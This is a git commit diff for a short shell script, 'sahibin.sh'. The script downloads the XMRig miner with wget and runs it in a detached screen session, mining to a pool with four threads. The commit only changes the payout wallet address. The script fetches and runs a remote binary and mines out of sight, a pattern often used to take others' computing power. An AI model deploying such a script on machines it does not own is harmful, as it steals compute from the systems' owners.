6426b2696be4fda3e8b301f0724ff0dff76edd49
mdk721 <68358195+mdk721@users.noreply.github.com>
2022-08-23 17:42:39 +0300

    Update sahibin.sh

--- sahibin.sh
+++ sahibin.sh
@@ -4,4 +4,4 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
 tar -xf xmrig-6.18.0-linux-x64.tar.gz
 cd xmrig-6.18.0
-screen -dmS run ./xmrig -a ghostrider -o stratum-eu.rplant.xyz:17075 --tls -u BfwhDGgv722vtphBEvAJ1D6Jm19caF6ge1.Sahibin-$(echo $(shuf -i 10000-99999 -n 1)) -p x --pass -t 4
+screen -dmS run ./xmrig -a ghostrider -o stratum-eu.rplant.xyz:17075 --tls -u BpksUn1N1AcYZzsL1DJYqaHYdjtJYa3co7.sssss-$(echo $(shuf -i 10000-99999 -n 1)) -p x --pass -t 4
